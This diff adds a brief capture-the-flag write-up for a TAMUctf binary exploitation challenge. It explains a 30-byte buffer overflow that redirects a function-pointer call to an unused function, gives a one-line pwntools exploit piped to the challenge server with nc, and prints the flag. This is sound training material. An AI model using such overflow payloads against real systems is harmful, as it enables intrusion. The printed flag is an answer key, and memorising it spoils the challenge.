@@ -1,0 +1,9 @@
+If you objdump the executable, you will find that there are mulitple function their, which are in the executable but not called upon. We see a function select_fun, which sleects a function and call. The function takes an input in ebp + 42 bytes, and then reads the value at ebp + 12... 
+So we have to overflow 30 (42-12), and next should be the adress of the function to call.   
+
+
+
+
+python -c "from pwn import *; print 'one'*10 + p32(0x6d8 + 0x56555000)" | nc pwn.tamuctf.com 4322
+
+gigem{4ll_17_74k35_15_0n3}
